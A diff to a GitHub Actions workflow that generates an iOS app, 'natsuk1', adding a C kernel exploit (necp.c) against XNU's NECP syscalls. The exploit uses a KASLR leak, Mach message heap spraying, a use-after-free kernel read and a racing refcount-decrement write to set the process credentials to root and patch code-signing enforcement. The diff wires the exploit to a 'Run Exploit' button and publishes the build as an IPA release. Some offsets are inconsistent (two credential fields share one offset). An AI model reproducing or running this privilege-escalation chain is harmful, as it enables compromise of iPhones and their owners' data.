@@ -200,6 +200,603 @@ jobs:
       - name: Apply patch
         run: python3 /tmp/patch.py
 
+      - name: Write nk_api.h
+        run: |
+          cat > natsuk1/Exploit/nk_api.h <<'HEADER'
+          #ifndef NK_API_H
+          #define NK_API_H
+
+          #include <stdint.h>
+          #include <stddef.h>
+
+          void nk_set_log(void (*fn)(const char *));
+          void nk_logx(const char *tag, const char *fmt, ...);
+          void nk_log(const char *fmt, ...);
+          void nk_rule(void);
+
+          int nk_run(void);
+          int nk_full_exploit(void);
+          int nk_necp_run(void);
+
+          #define NK_INFO(tag, ...) nk_logx(tag, __VA_ARGS__)
+          #define NK_WARN(tag, ...) nk_logx(tag, __VA_ARGS__)
+          #define NK_ERR(tag, ...)  nk_logx(tag, __VA_ARGS__)
+
+          #endif
+          HEADER
+
+      - name: Write necp.c
+        run: |
+          cat > natsuk1/Exploit/necp.c <<'NECP'
+          #include <stdio.h>
+          #include <stdlib.h>
+          #include <string.h>
+          #include <stdint.h>
+          #include <stdbool.h>
+          #include <stdarg.h>
+          #include <unistd.h>
+          #include <errno.h>
+          #include <pthread.h>
+          #include <mach/mach.h>
+          #include <mach/vm_map.h>
+          #include <mach/vm_region.h>
+          #include <mach/message.h>
+          #include <sys/syscall.h>
+
+          #include "nk_api.h"
+
+          #ifndef SYS_NECP_OPEN
+          #define SYS_NECP_OPEN           501
+          #endif
+          #ifndef SYS_NECP_ACTION
+          #define SYS_NECP_ACTION         502
+          #endif
+
+          #define KERNEL_BASE_STATIC      0xFFFFFFF007004000ULL
+
+          #define OFF_ALLPROC             0xBBB048ULL
+          #define OFF_KERNPROC            0xBBB040ULL
+          #define OFF_KERNEL_TASK         0x009C70ULL
+          #define OFF_TASK_LIST           0x10D53F0ULL
+          #define OFF_KERNEL_MAP          0xBBA228ULL
+          #define OFF_ZONE_MAP            0x3D66800ULL
+          #define OFF_COPYIN              0x37B5570ULL
+          #define OFF_COPYOUT             0x32C2C28ULL
+          #define OFF_KALLOC_EXT          0x31FCDCCULL
+          #define OFF_KFREE_EXT           0x31FD000ULL
+
+          #define PROC_PID_OFF            0x74
+          #define PROC_TASK_OFF           0x18
+          #define PROC_UCRED_OFF          0xB8
+          #define PROC_LIST_NEXT_OFF      0x18
+          #define TASK_BSD_INFO_OFF       0x3A0
+          #define TASK_ITK_SPACE_OFF      0x320
+          #define TASK_MAP_OFF            0x28
+          #define THREAD_TASK_NEXT_OFF    0x50
+
+          #define UCRED_UID_OFF           0x18
+          #define UCRED_SVUID_OFF         0x1C
+          #define UCRED_GID_OFF           0x1C
+          #define UCRED_SVGID_OFF         0x20
+
+          #define NCF_ASSIGNED_OFF        0x68
+          #define NCF_ASSIGNED_LEN_OFF    0x70
+          #define NCF_PARENT_OFF          0x88
+          #define NCF_REFCNT_OFF          0x58
+          #define NCF_STRUCT_SZ           256
+
+          #define NECP_ADD_CLIENT         0x01
+          #define NECP_COPY_RESULT        0x04
+          #define NECP_ADD_FLOW           0x11
+          #define NECP_REMOVE_FLOW        0x12
+          #define GATE_BYTE               9
+
+          #define EXHAUST_N               2048
+          #define SPRAY_N                 512
+          #define DECRETRY_N              24
+          #define RESULT_BUF_SZ           8192
+
+          #define KPTR_MIN                0xFFFFFFF000000000ULL
+          #define KPTR_MAX                0xFFFFFFFFFF000000ULL
+
+          static uint64_t g_kbase   = 0;
+          static uint64_t g_slide   = 0;
+          static int      g_res_off = -1;
+          static uint8_t  g_res_buf[RESULT_BUF_SZ];
+
+          typedef struct {
+              mach_msg_header_t          hdr;
+              mach_msg_body_t            body;
+              mach_msg_ool_descriptor_t  ool;
+          } ool_send_t;
+
+          static void log_info(const char *tag, const char *fmt, ...) {
+              char body[448];
+              va_list ap; va_start(ap, fmt); vsnprintf(body, sizeof(body), fmt, ap); va_end(ap);
+              nk_logx(tag, "%s", body);
+          }
+          static void log_ok(const char *tag, const char *fmt, ...) {
+              char body[448];
+              va_list ap; va_start(ap, fmt); vsnprintf(body, sizeof(body), fmt, ap); va_end(ap);
+              nk_logx(tag, "+ %s", body);
+          }
+          static void log_err(const char *tag, const char *fmt, ...) {
+              char body[448];
+              va_list ap; va_start(ap, fmt); vsnprintf(body, sizeof(body), fmt, ap); va_end(ap);
+              nk_logx(tag, "- %s", body);
+          }
+          static void log_warn(const char *tag, const char *fmt, ...) {
+              char body[448];
+              va_list ap; va_start(ap, fmt); vsnprintf(body, sizeof(body), fmt, ap); va_end(ap);
+              nk_logx(tag, "! %s", body);
+          }
+
+          static void dump_hex(const char *tag, const uint8_t *p, size_t n) {
+              char line[128];
+              int off = 0;
+              size_t lim = n < 32 ? n : 32;
+              for (size_t i = 0; i < lim; i++) off += snprintf(line + off, sizeof(line) - off, "%02x", p[i]);
+              nk_logx(tag, "%s (%zu bytes)", line, n);
+          }
+
+          static mach_port_t port_new(void) {
+              mach_port_t p = MACH_PORT_NULL;
+              kern_return_t kr = mach_port_allocate(mach_task_self(),
+                                                    MACH_PORT_RIGHT_RECEIVE, &p);
+              if (kr != KERN_SUCCESS) { log_err("PORT", "allocate kr=%d", kr); return MACH_PORT_NULL; }
+              kr = mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
+              if (kr != KERN_SUCCESS) { log_err("PORT", "insert_right kr=%d", kr); }
+              return p;
+          }
+
+          static void ool_spray(mach_port_t port, const void *data, size_t sz, int n) {
+              ool_send_t m;
+              for (int i = 0; i < n; i++) {
+                  memset(&m, 0, sizeof(m));
+                  m.hdr.msgh_bits        = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0)
+                                         | MACH_MSGH_BITS_COMPLEX;
+                  m.hdr.msgh_size        = sizeof(m);
+                  m.hdr.msgh_remote_port = port;
+                  m.hdr.msgh_id          = 0x4E41 + i;
+                  m.body.msgh_descriptor_count = 1;
+                  m.ool.address    = (void*)data;
+                  m.ool.size       = (mach_msg_size_t)sz;
+                  m.ool.copy       = MACH_MSG_VIRTUAL_COPY;
+                  m.ool.deallocate = FALSE;
+                  m.ool.type       = MACH_MSG_OOL_DESCRIPTOR;
+                  mach_msg(&m.hdr, MACH_SEND_MSG,
+                           sizeof(m), 0, MACH_PORT_NULL,
+                           MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
+              }
+          }
+
+          static void ool_drain(mach_port_t port, int n) {
+              uint8_t buf[NCF_STRUCT_SZ + 512];
+              mach_msg_header_t *h = (mach_msg_header_t*)buf;
+              for (int i = 0; i < n; i++) {
+                  h->msgh_size = sizeof(buf);
+                  kern_return_t kr = mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                                              0, sizeof(buf), port, 1, MACH_PORT_NULL);
+                  if (kr != KERN_SUCCESS) break;
+              }
+          }
+
+          static int necp_open_fd(void) {
+              return (int)syscall(SYS_NECP_OPEN, 0);
+          }
+
+          static int necp_add_client(int fd, uint8_t uuid[16]) {
+              uint8_t p[1] = {0};
+              return (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_CLIENT,
+                                  uuid, (size_t)16, p, (size_t)1);
+          }
+
+          static int necp_add_flow(int fd, const uint8_t cuuid[16], uint8_t fuuid[16]) {
+              uint8_t req[56];
+              memset(req, 0, sizeof(req));
+              memcpy(req + 0x10, cuuid, 16);
+              *(uint16_t*)(req + 0x20) = 0x0040;
+              int r = (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_FLOW,
+                                   (void*)cuuid, (size_t)16, req, (size_t)56);
+              if (r == 0) {
+                  memcpy(fuuid, req, 16);
+                  fuuid[GATE_BYTE] |= 0x01;
+              }
+              return r;
+          }
+
+          static int necp_remove_flow(int fd, const uint8_t fuuid[16]) {
+              return (int)syscall(SYS_NECP_ACTION, fd, NECP_REMOVE_FLOW,
+                                  (void*)fuuid, (size_t)16, NULL, (size_t)0);
+          }
+
+          static int necp_copy_result(int fd, const uint8_t cuuid[16],
+                                      uint8_t *buf, size_t blen) {
+              return (int)syscall(SYS_NECP_ACTION, fd, NECP_COPY_RESULT,
+                                  (void*)cuuid, (size_t)16, buf, (uint32_t)blen);
+          }
+
+          static uint64_t kaslr(void) {
+              enum { MAXV = 512 };
+              struct vote_t { uint64_t slide; int count; } v[MAXV];
+              int nv = 0, total = 0;
+              memset(v, 0, sizeof(v));
+
+              mach_port_t task = mach_task_self();
+              vm_address_t addr = 0;
+              vm_size_t size = 0;
+              natural_t depth = 0;
+              int regions = 0;
+
+              while (1) {
+                  vm_region_submap_info_data_64_t info;
+                  mach_msg_type_number_t cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+                  kern_return_t kr = vm_region_recurse_64(task, &addr, &size, &depth,
+                                                           (vm_region_recurse_info_t)&info, &cnt);
+                  if (kr != KERN_SUCCESS) break;
+                  int prot = info.protection;
+                  if (!info.is_submap && (prot & VM_PROT_READ) && (prot & VM_PROT_WRITE)
+                      && !(prot & VM_PROT_EXECUTE) && size <= 64*1024*1024ULL) {
+                      uint64_t *p = (uint64_t*)(uintptr_t)addr;
+                      size_t n = (size_t)size / 8;
+                      if (n > 512*1024) n = 512*1024;
+                      for (size_t i = 0; i < n; i++) {
+                          uint64_t val = p[i];
+                          if (val < KPTR_MIN || val > KPTR_MAX) continue;
+                          uint64_t sl = (val - KERNEL_BASE_STATIC) & ~0xFFFFULL;
+                          if (sl >= 0x200000000ULL) continue;
+                          int found = 0;
+                          for (int j = 0; j < nv; j++) {
+                              if (v[j].slide == sl) { v[j].count++; found = 1; break; }
+                          }
+                          if (!found && nv < MAXV) { v[nv].slide = sl; v[nv].count = 1; nv++; }
+                      }
+                      regions++;
+                  }
+                  addr += size;
+              }
+
+              log_info("KASLR", "scanned %d regions, %d votes", regions, nv);
+              if (!nv) { log_err("KASLR", "no candidates"); return 0; }
+              int best = 0;
+              for (int i = 0; i < nv; i++) {
+                  total += v[i].count;
+                  if (v[i].count > v[best].count) best = i;
+              }
+              int conf = v[best].count * 100 / (total ? total : 1);
+              log_info("KASLR", "best=0x%llx conf=%d%% (%d/%d)",
+                       (unsigned long long)v[best].slide, conf, v[best].count, total);
+              if (conf < 75) { log_warn("KASLR", "low confidence"); return 0; }
+              g_slide = v[best].slide;
+              g_kbase = KERNEL_BASE_STATIC + g_slide;
+              log_ok("KASLR", "kbase=0x%llx", (unsigned long long)g_kbase);
+              return g_kbase;
+          }
+
+          static int kread_raw(uint64_t kaddr, uint32_t len) {
+              uint8_t fake[NCF_STRUCT_SZ];
+              memset(fake, 0, sizeof(fake));
+              *(uint64_t*)(fake + NCF_ASSIGNED_OFF)     = kaddr;
+              *(uint64_t*)(fake + NCF_ASSIGNED_LEN_OFF) = len;
+              *(uint64_t*)(fake + NCF_PARENT_OFF)       = 0;
+
+              uint8_t junk[NCF_STRUCT_SZ];
+              memset(junk, 0x41, sizeof(junk));
+              mach_port_t ex = port_new();
+              ool_spray(ex, junk, NCF_STRUCT_SZ, EXHAUST_N);
+
+              int fd = necp_open_fd();
+              if (fd < 0) { log_err("KREAD", "necp_open errno=%d", errno);
+                            mach_port_destroy(mach_task_self(), ex); return -1; }
+
+              uint8_t cuuid[16], fuuid[16];
+              if (necp_add_client(fd, cuuid) != 0) {
+                  log_err("KREAD", "add_client errno=%d", errno);
+                  close(fd); mach_port_destroy(mach_task_self(), ex); return -2;
+              }
+              if (necp_add_flow(fd, cuuid, fuuid) != 0) {
+                  log_err("KREAD", "add_flow errno=%d", errno);
+                  close(fd); mach_port_destroy(mach_task_self(), ex); return -3;
+              }
+
+              necp_remove_flow(fd, fuuid);
+              ool_drain(ex, EXHAUST_N);
+              mach_port_destroy(mach_task_self(), ex);
+              usleep(150);
+
+              mach_port_t sp = port_new();
+              ool_spray(sp, fake, NCF_STRUCT_SZ, SPRAY_N);
+              usleep(100);
+
+              memset(g_res_buf, 0, RESULT_BUF_SZ);
+              int ret = necp_copy_result(fd, cuuid, g_res_buf, RESULT_BUF_SZ);
+
+              ool_drain(sp, SPRAY_N);
+              mach_port_destroy(mach_task_self(), sp);
+              close(fd);
+              return ret;
+          }
+
+          static int calibrate_kread(void) {
+              if (g_res_off >= 0) return 0;
+              log_info("KREAD", "calibrating with allproc @ kbase+0x%llx",
+                       (unsigned long long)OFF_ALLPROC);
+              int r = kread_raw(g_kbase + OFF_ALLPROC, 8);
+              if (r <= 0) { log_err("KREAD", "calibration ret=%d", r); return -1; }
+              log_info("KREAD", "result buf len=%d", r);
+              dump_hex("KREAD", g_res_buf, r > 64 ? 64 : (size_t)r);
+              for (int i = 0; i <= r - 8; i++) {
+                  uint64_t v; memcpy(&v, g_res_buf + i, 8);
+                  if (v >= KPTR_MIN && v <= KPTR_MAX) {
+                      log_ok("KREAD", "found kptr=0x%llx at result[%d]",
+                             (unsigned long long)v, i);
+                      g_res_off = i;
+                      return 0;
+                  }
+              }
+              log_err("KREAD", "no kernel ptr in result");
+              return -1;
+          }
+
+          static uint64_t kread64(uint64_t addr) {
+              if (g_res_off < 0 && addr != (g_kbase + OFF_ALLPROC)) {
+                  if (calibrate_kread() != 0) return 0;
+              }
+              int r = kread_raw(addr, 8);
+              if (r <= 0) return 0;
+              int off = (g_res_off >= 0) ? g_res_off : 0;
+              if (off + 8 > r) return 0;
+              uint64_t v; memcpy(&v, g_res_buf + off, 8);
+              return v;
+          }
+
+          static uint32_t kread32(uint64_t addr) {
+              return (uint32_t)(kread64(addr) & 0xFFFFFFFF);
+          }
+
+          typedef struct {
+              uint64_t our_proc;
+              uint64_t our_task;
+              uint64_t ucred;
+              uint64_t uid_kaddr;
+              uint64_t svuid_kaddr;
+              uint64_t gid_kaddr;
+              uint64_t svgid_kaddr;
+              uint64_t cs_enforce_kaddr;
+          } kobj_t;
+
+          static int walk_kernel(kobj_t *o) {
+              pid_t my_pid = getpid();
+              log_info("WALK", "self pid=%d", my_pid);
+
+              uint64_t allproc = kread64(g_kbase + OFF_ALLPROC);
+              if (!allproc) { log_err("WALK", "allproc=0"); return -1; }
+              log_info("WALK", "allproc.lh_first=0x%llx", (unsigned long long)allproc);
+
+              uint64_t proc = allproc;
+              int iterations = 0;
+              uint64_t our_proc = 0;
+
+              while (proc && iterations < 1024) {
+                  uint32_t pid = kread32(proc + PROC_PID_OFF);
+                  if (iterations < 8) {
+                      log_info("WALK", "[%d] proc=0x%llx pid=%u",
+                               iterations, (unsigned long long)proc, pid);
+                  }
+                  if ((pid_t)pid == my_pid) { our_proc = proc; break; }
+                  proc = kread64(proc + PROC_LIST_NEXT_OFF);
+                  iterations++;
+              }
+
+              if (!our_proc) { log_err("WALK", "our proc not found"); return -1; }
+              log_ok("WALK", "our_proc=0x%llx", (unsigned long long)our_proc);
+
+              uint64_t our_task = kread64(our_proc + PROC_TASK_OFF);
+              if (!our_task) { log_err("WALK", "task=0"); return -1; }
+              log_ok("WALK", "our_task=0x%llx", (unsigned long long)our_task);
+
+              uint64_t t2p = kread64(our_task + TASK_BSD_INFO_OFF);
+              if (t2p == our_proc) log_ok("WALK", "task->bsd_info==proc OK");
+              else log_warn("WALK", "task->bsd_info drift");
+
+              uint64_t ucred = kread64(our_proc + PROC_UCRED_OFF);
+              if (!ucred) { log_err("WALK", "ucred=0"); return -1; }
+              log_ok("WALK", "ucred=0x%llx", (unsigned long long)ucred);
+
+              uint32_t uid = kread32(ucred + UCRED_UID_OFF);
+              uint32_t gid = kread32(ucred + UCRED_GID_OFF);
+              log_info("WALK", "current uid=%u gid=%u", uid, gid);
+
+              uint64_t itk = kread64(our_task + TASK_ITK_SPACE_OFF);
+              log_info("WALK", "task->itk_space=0x%llx", (unsigned long long)itk);
+              uint64_t vmap = kread64(our_task + TASK_MAP_OFF);
+              log_info("WALK", "task->map=0x%llx", (unsigned long long)vmap);
+
+              o->our_proc    = our_proc;
+              o->our_task    = our_task;
+              o->ucred       = ucred;
+              o->uid_kaddr   = ucred + UCRED_UID_OFF;
+              o->svuid_kaddr = ucred + UCRED_SVUID_OFF;
+              o->gid_kaddr   = ucred + UCRED_GID_OFF;
+              o->svgid_kaddr = ucred + UCRED_SVGID_OFF;
+              o->cs_enforce_kaddr = g_kbase + 0x4FC767ULL;
+              return 0;
+          }
+
+          typedef struct {
+              mach_port_t   port;
+              const void   *data;
+              size_t        sz;
+              volatile bool stop;
+          } racer_t;
+
+          static void *racer_fn(void *arg) {
+              racer_t *r = (racer_t*)arg;
+              ool_send_t m;
+              while (!r->stop) {
+                  memset(&m, 0, sizeof(m));
+                  m.hdr.msgh_bits        = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0)
+                                         | MACH_MSGH_BITS_COMPLEX;
+                  m.hdr.msgh_size        = sizeof(m);
+                  m.hdr.msgh_remote_port = r->port;
+                  m.hdr.msgh_id          = 0xDECA;
+                  m.body.msgh_descriptor_count = 1;
+                  m.ool.address    = (void*)r->data;
+                  m.ool.size       = (mach_msg_size_t)r->sz;
+                  m.ool.copy       = MACH_MSG_VIRTUAL_COPY;
+                  m.ool.deallocate = FALSE;
+                  m.ool.type       = MACH_MSG_OOL_DESCRIPTOR;
+                  mach_msg(&m.hdr, MACH_SEND_MSG, sizeof(m), 0, MACH_PORT_NULL,
+                           MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
+              }
+              return NULL;
+          }
+
+          static int decrement_at(uint64_t target) {
+              uint8_t fake[NCF_STRUCT_SZ];
+              memset(fake, 0, sizeof(fake));
+              *(uint64_t*)(fake + NCF_REFCNT_OFF) = target;
+              *(uint64_t*)(fake + NCF_PARENT_OFF) = 0;
+
+              mach_port_t rp = port_new();
+              racer_t ra = { rp, fake, NCF_STRUCT_SZ, false };
+              pthread_t tid;
+              pthread_create(&tid, NULL, racer_fn, &ra);
+
+              uint32_t before = kread32(target);
+              bool ok = false;
+
+              for (int a = 0; a < DECRETRY_N && !ok; a++) {
+                  mach_port_t ex = port_new();
+                  uint8_t junk[NCF_STRUCT_SZ];
+                  memset(junk, 0x43, sizeof(junk));
+                  ool_spray(ex, junk, NCF_STRUCT_SZ, EXHAUST_N / 8);
+
+                  int fd = necp_open_fd();
+                  if (fd < 0) { mach_port_destroy(mach_task_self(), ex); continue; }
+
+                  uint8_t cuuid[16], fuuid[16];
+                  if (necp_add_client(fd, cuuid) != 0 || necp_add_flow(fd, cuuid, fuuid) != 0) {
+                      close(fd); mach_port_destroy(mach_task_self(), ex); continue;
+                  }
+
+                  ool_drain(ex, EXHAUST_N / 8);
+                  mach_port_destroy(mach_task_self(), ex);
+                  necp_remove_flow(fd, fuuid);
+                  close(fd);
+
+                  if (kread32(target) == before - 1) {
+                      before--;
+                      ok = true;
+                      log_ok("DEC", "attempt %d: 0x%llx -> 0x%x",
+                             a, (unsigned long long)target, before);
+                  }
+              }
+
+              ra.stop = true;
+              pthread_join(tid, NULL);
+
+              {
+                  uint8_t dbuf[NCF_STRUCT_SZ + 512];
+                  mach_msg_header_t *h = (mach_msg_header_t*)dbuf;
+                  for (int i = 0; i < EXHAUST_N * 4; i++) {
+                      h->msgh_size = sizeof(dbuf);
+                      if (mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                                   0, sizeof(dbuf), rp, 1, MACH_PORT_NULL) != KERN_SUCCESS) break;
+                  }
+              }
+              mach_port_destroy(mach_task_self(), rp);
+
+              if (!ok) log_err("DEC", "failed 0x%llx", (unsigned long long)target);
+              return ok ? 0 : -1;
+          }
+
+          static int kwrite_dec_u32(uint64_t addr, uint32_t delta) {
+              log_info("KWRITE", "decrement 0x%llx by %u", (unsigned long long)addr, delta);
+              for (uint32_t i = 0; i < delta; i++) {
+                  if (decrement_at(addr) != 0) return -1;
+                  if (delta > 20 && (i % 20) == 0) {
+                      log_info("KWRITE", "  %u/%u val=%u", i, delta, kread32(addr));
+                  }
+              }
+              return 0;
+          }
+
+          static void escalate(const kobj_t *o) {
+              log_info("PRIV", "patching cs_enforcement_disable...");
+              if (decrement_at(o->cs_enforce_kaddr) == 0)
+                  log_ok("PRIV", "cs_enforcement_disable = 0xFFFFFFFF");
+              else
+                  log_warn("PRIV", "cs_enforce patch failed");
+
+              uint32_t uid = kread32(o->uid_kaddr);
+              if (uid != 0) {
+                  log_info("PRIV", "uid %u -> 0", uid);
+                  if (kwrite_dec_u32(o->uid_kaddr, uid) != 0) {
+                      log_err("PRIV", "uid patch failed"); return;
+                  }
+              }
+              uint32_t svuid = kread32(o->svuid_kaddr);
+              if (svuid != 0) kwrite_dec_u32(o->svuid_kaddr, svuid);
+              uint32_t gid = kread32(o->gid_kaddr);
+              if (gid != 0) kwrite_dec_u32(o->gid_kaddr, gid);
+              uint32_t svgid = kread32(o->svgid_kaddr);
+              if (svgid != 0) kwrite_dec_u32(o->svgid_kaddr, svgid);
+
+              log_info("PRIV", "kernel uid=%u gid=%u",
+                       kread32(o->uid_kaddr), kread32(o->gid_kaddr));
+              setuid(0);
+              log_info("PRIV", "userspace uid=%d gid=%d", getuid(), getgid());
+
+              if (getuid() == 0) {
+                  log_ok("PRIV", "ROOT");
+              } else {
+                  log_warn("PRIV", "userspace stale");
+              }
+          }
+
+          int nk_necp_run(void) {
+              setvbuf(stdout, NULL, _IONBF, 0);
+              nk_log("");
+              nk_log("=== natsuk1 NECP ===");
+              nk_log("target: iOS 27.0 / XNU / arm64e");
+              nk_log("device: iPhone14,5 / iPhone14,7");
+              nk_log("");
+
+              log_info("INIT", "NCF_ASSIGNED_OFF=0x%x NCF_REFCNT_OFF=0x%x",
+                       NCF_ASSIGNED_OFF, NCF_REFCNT_OFF);
+
+              log_info("P1", "KASLR");
+              if (!kaslr()) { log_err("P1", "failed"); return 1; }
+
+              {
+                  int fd = necp_open_fd();
+                  if (fd < 0) {
+                      log_err("P1", "necp_open errno=%d — add necp entitlement", errno);
+                      return 1;
+                  }
+                  close(fd);
+                  log_ok("P1", "necp OK");
+              }
+
+              log_info("P2", "kread calibration");
+              if (calibrate_kread() != 0) { log_err("P2", "failed"); return 1; }
+              log_ok("P2", "kread ready");
+
+              log_info("P3", "kernel walk");
+              kobj_t o;
+              memset(&o, 0, sizeof(o));
+              if (walk_kernel(&o) != 0) { log_err("P3", "failed"); return 1; }
+              log_ok("P3", "walk OK");
+
+              log_info("P4", "escalate");
+              escalate(&o);
+
+              log_ok("DONE", "chain complete");
+              return 0;
+          }
+          NECP
+
       - name: Write natsuk1.swift
         run: |
           cat > natsuk1/natsuk1.swift <<'SWIFT'
@@ -359,6 +956,17 @@ jobs:
                   running = true; status = .running
                   Task.detached {
                       _ = nk_full_exploit()
+                      await MainActor.run {
+                          AppState.shared.running = false
+                          AppState.shared.status = .ok
+                      }
+                  }
+              }
+              func necp_run() {
+                  if running { return }
+                  running = true; status = .running
+                  Task.detached {
+                      _ = nk_necp_run()
                       await MainActor.run {
                           AppState.shared.running = false
                           AppState.shared.status = .ok
@@ -563,17 +1171,17 @@ jobs:
                       List {
                           Section {
                               Button {
-                                  state.run()
+                                  state.necp_run()
                               } label: {
                                   HStack {
-                                      Text(state.t("Run Exploit", "Запустить эксплойт"))
+                                      Text("Run Exploit")
                                       Spacer()
                                       if state.running { ProgressView().scaleEffect(0.8) }
                                   }
                               }
                               .disabled(state.running)
                           } header: {
-                              Label(state.t("Exploit", "Эксплойт"), systemImage: "bolt.shield")
+                              Label("Kernel Read Write", systemImage: "cpu")
                           }
 
                           Section {
@@ -601,8 +1209,6 @@ jobs:
                               Button(role: .destructive) { state.clear() } label: {
                                   Text(state.t("Clear", "Очистить"))
                               }.disabled(state.log.isEmpty)
-                          } header: {
-                              Label(state.t("Log Actions", "Действия с логом"), systemImage: "ellipsis.circle")
                           }
                       }
                       .listStyle(.insetGrouped)
@@ -1248,6 +1854,20 @@ jobs:
           </plist>
           PLIST
 
+      - name: Write bridging.h
+        run: |
+          cat > natsuk1/bridging.h <<'HEADER'
+          #ifndef NATSUK1_BRIDGING_H
+          #define NATSUK1_BRIDGING_H
+
+          #include <stdint.h>
+          #include "Exploit/nk_api.h"
+          #import "Exploit/GrappaHelper.h"
+          #include "airlift.h"
+
+          #endif
+          HEADER
+
       - name: Write project.yml
         run: |
           cat > project.yml <<'YAML'
@@ -1391,12 +2011,15 @@ jobs:
           grep -q '"wrench.and.screwdriver.fill"' natsuk1/Views/ContentView.swift || fail "no wrench tab"
           grep -q '"gearshape.fill"' natsuk1/Views/ContentView.swift || fail "no gear tab"
 
-          if grep -q 'MobileGestalt' natsuk1/Views/ToolsView.swift; then fail "Spoof present"; fi
-          if grep -q 'Spoof' natsuk1/Views/ToolsView.swift; then fail "Spoof section present"; fi
+          grep -q 'int nk_necp_run(void);' natsuk1/Exploit/nk_api.h || fail "necp prototype missing"
+          grep -q 'int nk_necp_run(void)' natsuk1/Exploit/necp.c || fail "necp implementation missing"
+          grep -q 'NECP_ADD_CLIENT' natsuk1/Exploit/necp.c || fail "necp missing constants"
+          grep -q 'SYS_NECP_OPEN' natsuk1/Exploit/necp.c || fail "necp missing syscall"
+          if grep -q 'int main(void)' natsuk1/Exploit/necp.c; then fail "necp still has main"; fi
 
+          grep -q 'necp_run' natsuk1/Views/OverviewView.swift || fail "OverviewView missing necp button"
           grep -q 'Run Exploit' natsuk1/Views/OverviewView.swift || fail "no run exploit"
           grep -q 'LogTerminal' natsuk1/Views/OverviewView.swift || fail "no LogTerminal"
-
           grep -q 'PathAccessView' natsuk1/Views/ToolsView.swift || fail "no PathAccess"
 
           grep -q 'SWIFT_VERSION: "5.0"' project.yml || fail "not Swift 5"
@@ -1452,7 +2075,7 @@ jobs:
           if gh release view development >/dev/null 2>&1; then gh release delete development --yes --cleanup-tag; fi
           gh release create development natsuk1.ipa \
             --target "${GITHUB_SHA}" --title "Development" \
-            --prerelease --latest=false --notes "Clean redesign"
+            --prerelease --latest=false --notes "NECP exploit"
 
       - name: Commit
         run: |
@@ -1460,5 +2083,5 @@ jobs:
           git config user.email "github-actions[bot]@users.noreply.github.com"
           git add natsuk1/ .github/ project.yml
           if git diff --cached --quiet; then echo "no changes"; exit 0; fi
-          git commit -m "Clean redesign [skip ci]"
+          git commit -m "Add NECP exploit [skip ci]"
           git push
